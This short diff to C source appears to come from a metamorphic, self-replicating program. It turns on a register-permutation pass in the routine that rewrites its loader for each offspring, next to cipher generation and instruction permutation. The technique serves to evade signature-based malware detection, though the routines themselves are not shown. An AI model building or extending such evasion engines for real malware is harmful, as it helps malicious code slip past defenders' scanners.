@@ -30,7 +30,7 @@ bool		metamorph_self(uint64_t son_seed[2], uint64_t client_id)
 	if (!generate_cypher((void *)cypher, unique_seed, cypher_size)
 	|| !generate_decypher((void *)decypher, unique_seed, cypher_size)
 	|| !permutate_instructions(loader_entry, unique_seed, loader_size)
-	// || !permutate_registers(loader_entry, unique_seed, loader_size)
+	|| !permutate_registers(loader_entry, unique_seed, loader_size)
 	|| !true) // add more metamorphosis above!
 		return errors(ERR_THROW, _ERR_METAMORPH_SELF);
 
